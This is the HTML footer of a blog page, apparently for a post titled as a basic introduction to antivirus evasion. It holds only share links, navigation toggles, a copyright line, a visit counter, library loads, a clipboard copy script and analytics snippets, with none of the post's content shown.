  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2021/10/28/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/&t=免杀基础入门篇"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2021-2024
    0r@nge
  </div>
  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
</footer>

    </div>

    

    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-86660611-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-86660611-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
